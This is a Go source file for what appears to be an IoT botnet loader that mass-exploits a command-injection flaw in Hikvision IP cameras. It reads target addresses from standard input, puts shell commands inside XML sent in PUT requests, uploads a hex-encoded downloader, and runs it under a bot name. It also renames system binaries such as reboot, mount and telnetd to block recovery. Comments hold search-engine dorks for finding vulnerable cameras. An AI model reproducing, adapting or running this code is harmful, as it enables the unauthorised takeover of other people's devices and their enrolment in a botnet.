package main

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// kent was here

/*
	Global dork: Camera Web Server product:"Hikvision IP Camera" !cloud !honeypot !citrix
*/

/*
	Dork: "Web Version: 4.0.1" Hikvision IP Camera: Server: App-webs/ !docker !cloud !citrix !honeypot
*/

var (
	useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"

	wg      sync.WaitGroup
	dlrFile = ".pi"

	payloads = []string{
		"mv /sbin/reboot /sbin/r4boot;mv /bin/mkdir /bin/mkdicks;rm -rf webLib;mv /sbin/fdisk /sbin/fuckyou; mv /sbin/poweroff /sbin/powerdick",
		"mv /bin/mount /bin/montaverga; mv /bin/unmount /bin/puto; mv /bin/sleep /bin/mierda; mv /sbin/telnetd /sbin/kkpdo",
		"rm " + dlrFile,
		"rm -rf webLib/",
		"chmod 777 update;./update;chmod 777 " + dlrFile,
	}
)

var (
	archfile = "arm5"
	seconds  uint64
	conns    uint64
	errors   uint64
	failed   uint64
	checked  uint64
	dropped  uint64
	verified uint64
	locked   uint64
	unlocked uint64

	arm5_dlr []string

	timeout = 10 * time.Second
)

func getRequest(target string, port string, path string) (string, error) {
	conn, err := net.DialTimeout("tcp", target+":"+port, timeout)

	if err != nil {
		return "", err
	}

	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			// no
		}
	}(conn)

	conn.SetDeadline(time.Now().Add(timeout))

	data := "GET " + path + " HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en US,en;q=0.9,sv;q=0.8\r\n"
	data += "Host: " + target + "\r\n"
	data += "\r\n"

	conn.Write([]byte(data))

	var buf bytes.Buffer

	_, err = io.Copy(&buf, conn)

	if err != nil && strings.Contains(err.Error(), "timeout") {
		return buf.String(), nil
	}

	return buf.String(), err
}

func putRequest(target string, path string, userdata string) (string, error) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", err
	}

	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			
		}
	}(conn)

	conn.SetDeadline(time.Now().Add(timeout))

	data := "PUT " + path + " HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en US,en;q=0.9,sv;q=0.8\r\n"
	data += "Host: " + target + "\r\n"
	data += "Content-Length: " + strconv.Itoa(len(userdata)) + "\r\n"
	data += "\r\n" + userdata + "\r\n\r\n"

	conn.Write([]byte(data))

	var buf bytes.Buffer

	_, err = io.Copy(&buf, conn)

	if err != nil && strings.Contains(err.Error(), "timeout") {
		return buf.String(), nil
	}

	return buf.String(), err
}

func PUT(data string, ip string, port string) bool {
	_, err := putRequest(ip+":"+port, "/SDK/webLanguage", data)

	if err != nil {
		return false
	}

	return true
}

func sendPayload(ip string, port string, locked bool) bool {
	var data string
	var botname string

	if locked {
		botname = "c.blue"
	} else {
		botname = "c.new"
	}

	for _, cmd := range payloads {

		data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(" + cmd + ")</language>"

		if !PUT(data, ip, port) {
			failed++
			return false
		}
	}

	data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(./" + dlrFile + " " + botname + ")</language>"

	if !PUT(data, ip, port) {
		failed++
		return false
	}

	data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(rm -rf update " + dlrFile + " webLib)</language>"

	if !PUT(data, ip, port) {
		failed++
		return false
	}

	return true
}

func getBotArch(ip string, port string) string {

	if !PUT("<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(cat /proc/cpuinfo > webLib/"+archfile+")</language>", ip, port) {
		return ""
	}

	resp, err := getRequest(ip, port, "/"+archfile)

	if err != nil {
		return ""
	}

	if strings.Contains(strings.ToLower(resp), "v4l") {
		return "arm"
	} else if strings.Contains(strings.ToLower(resp), "v5l") {
		return "arm5"

	} else if strings.Contains(strings.ToLower(resp), "v7l") {
		return "arm7"
	} else {
		return ""
	}
}

func checkBot(ip string, port string) bool {
	resp, err := getRequest(ip, port, "/")

	if err != nil {
		return false
	}

	if strings.Contains(resp, "ETag") && strings.Contains(resp, "/doc/page/") {
		return true
	} else if strings.Contains(resp, "404") && strings.Contains(resp, "Can't locate document: /") {
		return true
	}

	return false
}

func verifyBot(ip string, port string) (bool, bool) {
	resp, err := getRequest(ip, port, "/dispatch.asp")

	if err != nil {
		return false, false
	}

	if strings.Contains(resp, "seajsnode") || strings.Contains(resp, "Server: App-webs") {
		if strings.Contains(resp, "ETag") {
			unlocked++
			return true, false
		} else if strings.Contains(resp, "404") && strings.Contains(resp, "188") && !strings.Contains(resp, "ETag") {
			locked++
			return true, true
		}
	}

	return false, false
}

func decConns() {
	conns--
}

func readArch(dlr string) []string {
	f, err := os.Open(dlr)

	if err != nil {
		fmt.Printf("Failed to open %s!\n", dlr)
		os.Exit(1)
	}

	tmp_hex := ""
	buf := make([]byte, 32)
	hex_arr := make([]byte, 1)

	var dlr_hex []string

	for {
		_, err := f.Read(buf)

		if err == io.EOF {
			break
		}

		for _, ch := range buf {
			hex_arr[0] = ch
			hx := hex.EncodeToString(hex_arr)
			tmp_hex += "\\x" + hx
		}

		dlr_hex = append(dlr_hex, tmp_hex)
		tmp_hex = ""
	}

	fmt.Printf("Loaded -> %s\n", dlr_hex) //
	return dlr_hex
}

func uploadDlr(ip, port string, dlr []string) {
	cat := ""

	for idx, hex := range dlr {

		if idx == 0 {
			cat = ">"
		} else {
			cat = ">>"
		}

		cmd := "echo -ne \"" + hex + "\" " + cat + " update"

		data := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(" + cmd + ")</language>"

		fmt.Printf("Sending: %s\n", data)

		if !PUT(data, ip, port) {
			failed++
			return
		}
	}
}

func infect(ip string, port string) {
	wg.Add(1)
	defer wg.Done()

	if strings.Contains(port, "NULL") {
		args := strings.Split(ip, ":")
		if len(args) != 2 {
			return
		}

		ip = args[0]
		port = args[1]
	}

	if !checkBot(ip, port) {
		return
	}

	var penis, locked = verifyBot(ip, port)
	if !penis {
		//fmt.Printf("Failed\n")
		return
	}

	//arch := getBotArch(ip, port)
	//
	//if arch == "" {
	//	return
	//}

	uploadDlr(ip, port, arm5_dlr)

	verified++
	conns++

	defer decConns()

	if sendPayload(ip, port, locked) {
		dropped++
	} else {
		failed++
	}
}
func stopper() {
	time.Sleep(60 * time.Second)
	for {
		time.Sleep(1 * time.Second)
		if runtime.NumGoroutine() < 500 {
			os.Exit(0)
		}
	}
}

func titleWriter() {
	for {
		fmt.Printf("%d's -> Connections: %d -> Errors: %d -> Failed: %d -> Verified: %d -> Locked: %d -> Unlocked: %d -> Go Routines: %d\n", seconds, conns, errors, failed, verified, locked, unlocked, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
		seconds++
	}
}

func main() {
	var protocol string
	var port string
	var routines int

	flag.StringVar(&protocol, "proto", "http", "Device webserver.")
	flag.StringVar(&port, "port", "NULL", "Device port.")
	flag.IntVar(&routines, "routines", 100000, "Max go routines")

	flag.Usage = func() { flag.PrintDefaults() }
	flag.Parse()

	go titleWriter()
	go stopper()

	arm5_dlr = readArch("dlr.arm5")

	for {
		scan := bufio.NewScanner(os.Stdin)
		for scan.Scan() {
			if runtime.NumGoroutine() >= routines {
				time.Sleep(1 * time.Second)
			}
			go infect(scan.Text(), port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
